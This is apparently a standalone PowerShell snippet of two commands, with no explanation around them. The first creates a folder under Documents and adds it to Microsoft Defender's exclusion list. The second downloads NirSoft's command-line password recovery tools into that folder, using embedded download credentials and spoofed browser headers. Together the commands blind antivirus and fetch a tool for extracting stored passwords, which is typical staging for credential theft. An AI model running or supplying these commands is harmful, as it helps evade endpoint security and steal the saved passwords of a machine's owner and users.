$safeEnv = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "safe_env"; New-Item -Path $safeEnv -ItemType Directory -Force | Out-Null; Add-MpPreference -ExclusionPath $safeEnv; Write-Host "Created & excluded: $safeEnv"
Invoke-WebRequest -Uri "https://www.nirsoft.net/protected_downloads/passreccommandline.zip" -OutFile "$env:USERPROFILE\Documents\safe_env\passreccommandline.zip" -Headers @{Authorization=("Basic "+[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("download:nirsoft123!"))); "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"; Accept="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"; "Accept-Language"="en-US,en;q=0.5"; Referer="https://www.nirsoft.net/password_recovery_tools.html"} -UseBasicParsing
